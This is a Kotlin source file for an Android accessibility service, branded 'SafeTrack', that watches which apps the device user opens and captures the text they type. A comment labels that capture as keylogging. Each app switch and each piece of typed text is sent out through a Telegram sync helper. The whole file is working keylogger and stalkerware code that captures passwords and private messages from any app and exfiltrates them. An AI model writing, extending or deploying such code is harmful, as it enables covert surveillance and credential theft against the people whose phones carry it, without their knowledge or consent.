package com.safetrack.services

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.util.Log
import com.safetrack.utils.TelegramSyncHelper
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class SafeTrackAccessibilityService : AccessibilityService() {

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val packageName = event.packageName?.toString() ?: "Unknown"

        when (event.eventType) {
            // Catches App Switches
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val message = "📱 App Opened: $packageName"
                Log.d("SafeTrack", message)
                sendToTelegram(message)
            }
            
            // Catches Typed Text (Keylogging)
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val typedText = event.text?.joinToString("") ?: ""
                if (typedText.isNotEmpty()) {
                    val message = "⌨️ KeyLog:\nApp: $packageName\nText: $typedText"
                    Log.d("SafeTrack", message)
                    sendToTelegram(message)
                }
            }
        }
    }

    private fun sendToTelegram(message: String) {
        CoroutineScope(Dispatchers.IO).launch {
            // Using the TelegramSyncHelper we built earlier
            TelegramSyncHelper.sendLogData(message)
        }
    }

    override fun onInterrupt() {
        Log.e("SafeTrack", "Accessibility Service Interrupted")
    }
}
